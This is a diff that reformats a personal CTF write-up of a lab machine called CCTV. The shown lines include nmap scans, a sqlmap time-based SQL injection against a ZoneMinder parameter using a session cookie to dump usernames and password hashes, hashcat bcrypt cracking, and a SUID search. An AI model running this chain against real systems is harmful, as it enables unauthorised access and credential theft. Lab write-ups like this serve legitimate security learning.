@@ -15,21 +15,29 @@ On today's hacking i've been working on a machine called CCTV, it's an "easy" no
 Us usual, I've started with the meta of all CTF's which is start with enumeration, specifically with nmap. I rann the following command and also, recently I've learned that it's a good behavior to export all the results into a file, this way come back to those results and compare them.
 
 ``nmap -p- --min-rate=5000 -Pn -n -sS 10.129.5.206 -oN portsv1.txt``
+
 ``-p- --> to scann all ports``
-``--min-rate=5000 --> to send at least 5000 packets/s
-``-Pn --> disable host discovery
-``-n --> disable name resolution
-``-sS --> Stealth Scan, faster and silent
-``-oN --> export
+
+``--min-rate=5000 --> to send at least 5000 packets/s``
+``-Pn --> disable host discovery``
+
+``-n --> disable name resolution``
+
+``-sS --> Stealth Scan, faster and silent``
+
+``-oN --> export``
 
 ![CCTV](/assets/CCTV/cctvnmap1.png)
 
 After the first result, port 22 and 80, I ran the second nmap command to get more information about the services and it's versions.
 
 ``nmap -p22,80 -sCV 10.129.5.206 -oN portsv2.txt``
-``-p22,80 --> specify the ports
-``-sCV --> nmap scripts to get the information
-``-oN --> export
+
+``-p22,80 --> specify the ports``
+
+``-sCV --> nmap scripts to get the information``
+
+``-oN --> export``
 
 ![CCTV](/assets/CCTV/cctvnmap2.png)
 
@@ -92,6 +100,7 @@ To my surprise theres a really big query with a lot of things added here, but I 
 ![CCTV](/assets/CCTV/burpeventcatch1.png)
 
 ``/zm/index.php?view=request&request=event&action=removetag&tid=1``
+
 ``/zm/index.php?view=request&request=event&action=removetag&tid=1&id=1``
 
 To this -->
@@ -109,17 +118,27 @@ Grabbed the ZMSESSID cookie, verified the default databases for ZoneMinder and r
 
 ``sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1&id=1' --cookie="ZMSESSID=oe645nieb6fh3lhk0ierjn217p" --data="tid=1&id=1" -p tid --dbms=mysql --technique=T --ignore-code=500 --batch -D zm -T Users -C Username,Password --dump ``
 
-``--cookie --> my cookie
-``--data --> Data string to be sent through POST
-``-p --> testable parameter (it's next to the removetag)
-``--dbms=mysql --> DB
-``--technique=T --> Time based SQL Injection
-``--ignore-code=500 --> Ignore code 500 Internal server error
-``--batch --> never ask for user input, use the default behavior
-``-D zm--> DBMS database to enumerate
-``-T Users --> DBMS database tables to enumerate
-``-C Username,Password --> DBMS database columns to enumerate
-``--dump --> Dump DBMS database table entries
+``--cookie`` --> my cookie
+
+``--data`` --> Data string to be sent through POST
+
+``-p`` --> testable parameter (it's next to the removetag)
+
+``--dbms=mysql`` --> DB
+
+``--technique=T`` --> Time based SQL Injection
+
+``--ignore-code=500`` --> Ignore code 500 Internal server error
+
+``--batch`` --> never ask for user input, use the default behavior
+
+``-D zm`` --> DBMS database to enumerate
+
+``-T Users`` --> DBMS database tables to enumerate
+
+``-C Username,Password`` --> DBMS database columns to enumerate
+
+``--dump`` --> Dump DBMS database table entries
 
 
 
@@ -141,8 +160,10 @@ Moved the hashes into a text and ran the following ``hashcat`` command -->
 ![CCTV](/assets/CCTV/hashestxt.png)
 
 ``hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt``
-``-m 3200 --> bcrypt type
-``/usr/share/wordlists/rockyou.txt --> wordlist
+
+``-m 3200`` --> bcrypt type
+
+``/usr/share/wordlists/rockyou.txt`` --> wordlist
 
 ![CCTV](/assets/CCTV/hashcat.png)
 
@@ -167,7 +188,7 @@ Checked if I'm able to run anything with sudo, and nothing
 
 Tried to find any file with the suid bit set on it, and nothing. Found  `pkexec` but the version installed is not vulnerable. In other machines we could abuse the ``pkexec`` file.
 
-``find / -perm -4000 2>/dev/null
+``find / -perm -4000 2>/dev/null``
 
 ![CCTV](/assets/CCTV/pkexec.png)
 
